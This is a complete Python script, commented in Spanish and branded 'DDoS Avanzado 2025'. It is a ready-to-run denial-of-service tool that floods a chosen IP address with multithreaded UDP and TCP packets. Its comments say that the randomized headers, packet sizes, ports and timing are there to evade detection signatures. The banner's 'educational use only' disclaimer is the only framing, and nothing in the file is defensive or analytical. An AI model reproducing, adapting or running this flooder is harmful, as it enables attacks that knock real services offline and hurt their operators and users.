#!/usr/bin/env python3

import sys
import os
import time
import socket
import random
import argparse
import threading
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from ipaddress import ip_address, IPv4Address

# Configuración global
sent_packets = 0
start_time = time.time()
attack_running = True
lock = threading.Lock()

# Estilos ANSI para colores en la terminal
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def clear_screen():
    """Limpiar la pantalla de manera compatible con diferentes OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def validate_ip(ip):
    """Validar que la dirección IP sea válida"""
    try:
        return str(ip_address(ip))
    except ValueError:
        return False

def validate_port(port):
    """Validar que el puerto esté en el rango correcto"""
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
        return False
    except ValueError:
        return False

def signal_handler(sig, frame):
    """Maneja la interrupción del usuario con CTRL+C"""
    global attack_running
    print(f"\n{Colors.YELLOW}[*] Deteniendo el ataque...{Colors.ENDC}")
    attack_running = False
    time.sleep(1.5)
    show_stats()
    sys.exit(0)

def show_stats():
    """Muestra estadísticas del ataque"""
    global sent_packets, start_time
    duration = time.time() - start_time
    if duration > 0:
        pps = sent_packets / duration
    else:
        pps = 0
    
    print(f"\n{Colors.BOLD}{Colors.BLUE}═══════════ Estadísticas del Ataque ═══════════{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Paquetes Enviados: {Colors.BOLD}{sent_packets}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Duración: {Colors.BOLD}{duration:.2f} segundos{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Paquetes por segundo: {Colors.BOLD}{pps:.2f}{Colors.ENDC}")
    print(f"{Colors.BLUE}═════════════════════════════════════════{Colors.ENDC}\n")

def update_display(target_ip, target_port):
    """Actualiza la visualización en tiempo real"""
    global sent_packets, start_time
    
    while attack_running:
        duration = time.time() - start_time
        if duration > 0:
            pps = sent_packets / duration
        else:
            pps = 0
            
        clear_screen()
        print(f"{Colors.BOLD}{Colors.PURPLE}╔═══════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.PURPLE}║  DDoS Avanzado 2025                  ║{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.PURPLE}╚═══════════════════════════════════════╝{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Objetivo: {Colors.RED}{target_ip}:{target_port}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Tiempo transcurrido: {Colors.YELLOW}{duration:.2f}s{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Paquetes enviados: {Colors.YELLOW}{sent_packets}{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] Velocidad: {Colors.YELLOW}{pps:.2f} paquetes/s{Colors.ENDC}")
        print(f"{Colors.GREEN}[*] Ataque en progreso... Presiona CTRL+C para detener{Colors.ENDC}")
        time.sleep(1)

def generate_packet(min_size=64, max_size=1490):
    """Genera paquetes de tamaño aleatorio con contenido semi-aleatorio para evadir firmas"""
    size = random.randint(min_size, max_size)
    
    # Cabecera aleatoria para evadir firmas de detección
    header = bytes([random.randint(0, 255) for _ in range(8)])
    
    # Payload con patrones variables
    patterns = [
        bytes([i % 256 for i in range(64)]),
        bytes([random.randint(0, 255) for _ in range(64)]),
        b'A' * 64,
        os.urandom(64)
    ]
    
    payload = b''
    remaining = size - len(header)
    
    while remaining > 0:
        pattern = random.choice(patterns)
        if len(pattern) > remaining:
            payload += pattern[:remaining]
            remaining = 0
        else:
            payload += pattern
            remaining -= len(pattern)
    
    return header + payload

def send_packet(target_ip, target_port, sock_type="udp"):
    """Envía un solo paquete al objetivo"""
    global sent_packets
    
    try:
        if sock_type == "udp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif sock_type == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            try:
                sock.connect((target_ip, target_port))
            except:
                sock.close()
                return False
        else:
            return False
            
        # Generar paquete con tamaño variable y contenido aleatorio
        packet = generate_packet()
        
        # Enviar paquete
        if sock_type == "udp":
            sock.sendto(packet, (target_ip, target_port))
        else:
            sock.send(packet)
            
        sock.close()
        
        with lock:
            sent_packets += 1
        
        return True
    except:
        return False

def attack_thread(target_ip, target_port, sock_type):
    """Función para cada hilo de ataque"""
    while attack_running:
        if sock_type == "random":
            current_sock_type = random.choice(["udp", "tcp"])
        else:
            current_sock_type = sock_type
            
        # Elegir puerto aleatorio o usar el especificado
        if target_port == 0:
            port = random.randint(1, 65535)
        else:
            port = target_port
            
        send_packet(target_ip, port, current_sock_type)
        
        # Pequeña pausa aleatoria para evitar patrones detectables
        time.sleep(random.uniform(0.001, 0.01))

def start_attack(target_ip, target_port, threads, sock_type):
    """Inicia el ataque con múltiples hilos"""
    global attack_running, start_time
    
    start_time = time.time()
    attack_running = True
    
    # Registrar el manejador de señales para CTRL+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Iniciar hilo para mostrar estadísticas en tiempo real
    display_thread = threading.Thread(target=update_display, args=(target_ip, target_port))
    display_thread.daemon = True
    display_thread.start()
    
    # Iniciar hilos de ataque
    attack_threads = []
    for _ in range(threads):
        thread = threading.Thread(target=attack_thread, args=(target_ip, target_port, sock_type))
        thread.daemon = True
        attack_threads.append(thread)
        thread.start()
    
    # Esperar a que termine el ataque (hasta que se presione CTRL+C)
    try:
        while attack_running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        signal_handler(None, None)

def show_banner():
    """Muestra el banner del programa"""
    now = datetime.now()
    
    clear_screen()
    print(f"{Colors.BOLD}{Colors.PURPLE}╔═══════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.PURPLE}║           DDoS Avanzado 2025          ║{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.PURPLE}╚═══════════════════════════════════════╝{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Versión: {Colors.GREEN}2.5.0{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Fecha: {Colors.GREEN}{now.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Uso: {Colors.GREEN}Este script es solo para fines educativos y pruebas en entornos controlados{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Optimizado para Termux (No requiere root){Colors.ENDC}")
    print(f"{Colors.RED}[!] Advertencia: El uso no autorizado de esta herramienta es ilegal{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.PURPLE}═════════════════════════════════════════{Colors.ENDC}\n")

def main():
    """Función principal del programa"""
    show_banner()
    
    # Configurar parser de argumentos
    parser = argparse.ArgumentParser(description="Script DDoS avanzado 2025")
    parser.add_argument("-t", "--target", help="Dirección IP objetivo")
    parser.add_argument("-p", "--port", type=int, help="Puerto objetivo (0 para aleatorio)")
    parser.add_argument("-th", "--threads", type=int, default=50, help="Número de hilos (default: 50)")
    parser.add_argument("-m", "--method", choices=["udp", "tcp", "random"], default="random", 
                        help="Método de ataque: udp, tcp, random (default: random)")
    
    # Parsear argumentos o solicitar entrada manual
    args = parser.parse_args()
    
    if args.target:
        target_ip = args.target
    else:
        target_ip = input(f"{Colors.BLUE}[?] Ingresa la IP objetivo: {Colors.ENDC}")
    
    # Validar IP
    if not validate_ip(target_ip):
        print(f"{Colors.RED}[!] Error: Dirección IP inválida{Colors.ENDC}")
        sys.exit(1)
    
    if args.port is not None:
        target_port = args.port
    else:
        port_input = input(f"{Colors.BLUE}[?] Ingresa el puerto (1-65535, 0 para aleatorio): {Colors.ENDC}")
        target_port = int(port_input) if port_input.isdigit() else 0
    
    # Validar puerto
    if target_port != 0 and not validate_port(target_port):
        print(f"{Colors.RED}[!] Error: Puerto inválido. Debe estar entre 1-65535{Colors.ENDC}")
        sys.exit(1)
    
    # Solicitar número de hilos si no se especificó
    threads = args.threads
    if threads <= 0:
        print(f"{Colors.RED}[!] Error: El número de hilos debe ser mayor que 0{Colors.ENDC}")
        sys.exit(1)
    
    # Método de ataque
    sock_type = args.method
    
    # Confirmación
    print(f"\n{Colors.YELLOW}[*] Configuración del ataque:{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Objetivo: {Colors.BOLD}{target_ip}:{target_port if target_port != 0 else 'aleatorio'}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Método: {Colors.BOLD}{sock_type}{Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Hilos: {Colors.BOLD}{threads}{Colors.ENDC}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] ¿Iniciar ataque? (s/n): {Colors.ENDC}").lower()
    if confirm != 's':
        print(f"{Colors.RED}[!] Ataque cancelado{Colors.ENDC}")
        sys.exit(0)
    
    # Iniciar ataque
    print(f"\n{Colors.GREEN}[*] Iniciando ataque...{Colors.ENDC}")
    start_attack(target_ip, target_port, threads, sock_type)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Programa terminado por el usuario{Colors.ENDC}")
        sys.exit(0)
